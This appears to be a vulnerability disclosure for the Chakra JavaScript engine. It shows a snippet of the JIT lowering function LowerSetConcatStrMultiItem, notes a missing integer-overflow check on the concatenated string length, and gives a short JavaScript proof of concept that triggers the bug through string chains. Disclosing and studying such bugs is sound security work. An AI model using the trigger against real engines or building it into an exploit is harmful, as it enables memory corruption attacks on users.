The method "Lowerer::LowerSetConcatStrMultiItem" is used to generate machine code to concatenate strings.
Here&#039;s a snippet of the method.
void Lowerer::LowerSetConcatStrMultiItem(IR::Instr * instr)
{
    ...
    IR::IndirOpnd * dstLength = IR::IndirOpnd::New(concatStrOpnd, Js::ConcatStringMulti::GetOffsetOfcharLength(), TyUint32, func);
    ...
    InsertAdd(false, dstLength, dstLength, srcLength, instr); <<------ (a)
    ...
}
 
At (a), there&#039;s no check for integer overflow.
 
Note: Chakra uses string chains to handle concatenated strings(the ConcatString class). So it doesn&#039;t require much memory to trigger the bug.
 
PoC:
*/
 
let a = &#039;&#039;;
let b = &#039;A&#039;.repeat(0x10000);
for (let i = 0; i < 0x10000; i++) {
    a = &#039;BBBBBBBBB&#039; + a + b;
}
 
print(a.length);
print(b.length);
print(a[0]);

